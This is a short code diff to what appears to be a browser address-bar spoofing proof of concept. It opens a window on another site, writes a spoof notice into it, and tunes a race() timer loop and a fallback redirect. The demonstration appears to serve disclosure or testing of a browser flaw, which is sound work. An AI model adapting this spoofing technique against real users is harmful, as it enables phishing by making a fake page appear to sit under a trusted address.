@@ -16,7 +16,7 @@
         windowSpoof.location.href !== 'about:blank';
       }
       catch (e) {
-        windowSpoof.location.href='https://www.google.com:88';
+        windowSpoof.location.href='https://www.google.com/csi';
       }
     }
     
@@ -25,7 +25,7 @@
       windowSpoof = window.open("https://www.microsoft.com:82","x");
       windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://apple.com/</h2>");
 
-      setInterval('race()', 0);
+      setInterval('race()', 100);
     
     }
    
